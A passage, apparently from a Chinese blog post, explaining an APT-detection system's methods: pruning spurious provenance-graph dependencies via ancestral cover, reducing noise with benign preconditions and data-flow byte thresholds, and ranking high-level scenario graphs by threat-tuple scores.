3.4避免虚假依赖</h2><p>（1）虚假依赖即与攻击活动不相关的依赖：</p><ul><li>假如某个日志轮换系统复制了某个日志文件，文件中包含了攻击者产生的部分信息。这种进程虽然代表了良性活动，但也会在起源图中被标记为与攻击进程存在依赖。如果此类依赖不被修剪的话，将会使HSG变得很大。</li></ul><p>所以我们的目标是留下强依赖，修剪掉弱依赖。一般地，在起源图中考虑有一条表示信息流的路径连接的两个实体，如果这两个实体拥有相同的恶意祖先，我们就说</p><p>（2）<strong>祖先覆盖 ancestral cover <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A C(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></strong></p><ul><li><p>f表示一条信息流路径</p></li><li><p>仅针对在f中的所有进程，不影响非进程节点</p></li></ul><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>p</mi><mo>∈</mo><mi>f</mi><mi mathvariant="normal">∃</mi><mi>a</mi><mo>∈</mo><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mspace width="1em"/><mi>a</mi><mo>=</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">\forall p \in f \exists a \in A C(f) \quad a=p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord">∃</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> is an ancestor of <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span></p><p>（3）<strong>最小祖先覆盖 minimum ancestral cover <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A C_{\min }(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></strong></p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A C_{\min }(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span>表示攻击者如果想要控制整条信息流路径，那么他所需要拿下的最少祖先节点数</li></ul><p>（3）<strong>路径因子 path <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mo>−</mo></msub></mrow><annotation encoding="application/x-tex">_{-}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.466662em;vertical-align:-0.208331em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span> factor <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">(</mo><msub><mi>N</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>N</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(N_{1}, N_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></strong></p><ul><li>考虑从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">N_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">N_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的所有的信息流路径<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>f</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">f_{1}, \dots, f_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">m_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">f_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的最小祖先覆盖。那么，path <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mo>−</mo></msub></mrow><annotation encoding="application/x-tex">_{-}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.466662em;vertical-align:-0.208331em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span> factor <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">(</mo><msub><mi>N</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>N</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(N_{1}, N_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>m</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">m_{1}, \ldots, m_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中的最小值。</li></ul><h2 id="35-降低噪声"><a class="markdownIt-Anchor" href="#35-降低噪声"></a> 3.5 降低噪声</h2><p>噪声：良性活动匹配到了TTP规则。基于训练数据集产生降噪规则，包括两个概念：</p><ul><li><strong>良性前提条件匹配</strong></li></ul><p>对于每个进程，我们的系统运行在良性的环境中并学习经常遇到的先决条件。在运行过程中，一旦某个被触发的TTP的先决条件与我们在训练中得到的条件（benign）相匹配，我们便忽略该TTP。</p><p>这种方法可能会导致漏报（false negative），比如一个恶意事件如果匹配到了我们在良心环境中训练得到的良性先决条件，那么这个恶意事件就可能会被忽略。例如，即便没有任何攻击，在nginx的启动阶段也会执行read /etc/passwd，然而如果我们将该行为列入白名单的话，如果有恶意事件是读取改文件，那么该恶意事件就会被忽略。</p><ul><li><strong>良性数据流数量</strong></li></ul><p>为了解决上述问题，提出了用<strong>字节转移</strong>度量的数据流数量的概念。比如从/etc/passwd到nginx的数据流数量等于/etc/passwd文件的大小。因此，如果观察到更多的字节从/etc/passwd流向nginx，那么该信息流可能是攻击的一部分。为了确定信息流数量的<strong>临界点</strong>，我们在一段时间的良性活动中观察process-file和process-socket活动。</p><h2 id="36-信号关联和检测"><a class="markdownIt-Anchor" href="#36-信号关联和检测"></a> 3.6 信号关联和检测</h2><p>对每一个HSG定义<strong>严重程度评分(severity score)</strong>，据此来确定一个HSG会构成APT攻击的可能性</p><ul><li><strong>威胁元组（Threat Tuples）</strong></li></ul><p>对于每一个HSG，每一个Threat Tuple是一个7元组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">⟨</mo><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>3</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>S</mi><mn>7</mn></msub><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle S_{1}, S_{2}, {S}_{3}, \ldots, S_{7}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表对应于APT攻击阶段的威胁程度。一个APT阶段通常会包含许多APT，选取威胁程度最高的来构成威胁元组。</p><p>例如下图的Threat Tuple为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⟨</mo><mi>M</mi><mo separator="true">,</mo><mi>L</mi><mo separator="true">,</mo><mi>H</mi><mo separator="true">,</mo><mi>H</mi><mo separator="true">,</mo><mo>−</mo><mo separator="true">,</mo><mi>H</mi><mo separator="true">,</mo><mi>M</mi><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">\langle M, L, H, H,-, H, M\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⟨</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">⟩</span></span></span></span></p><p><img src="https://img-blog.csdnimg.cn/20200115205445841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li><strong>HSG排名和优先级（HSG Ranking and Prioritization）</strong></li></ul><p>为了将HSGs排名，首先根据下图将Threat Tuple转化为数值类型，接下来将代表7个APT阶段的分数合并为一个整体的分数。下图中威胁等级的分数可以根据企业的实际情况自己制定。因此，合并规则基于以下两个准测：（1）灵活性和定制化（2）该分数要能够反映APT攻击步骤是如何展开的。</p><p><img src="https://img-blog.csdnimg.cn/20200115205500172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>因此，为元组中的每一个entry设置一个权重：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mrow><mo fence="true">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mi>w</mi><mi>i</mi></msub></msup><mo>≥</mo><mi>τ</mi></mrow><annotation encoding="application/x-tex">\prod_{i=1}^{n}\left(S_{i}\right)^{w_{i}} \geq \tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></span></p><p>其中，n表示APT攻击的步骤数，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation 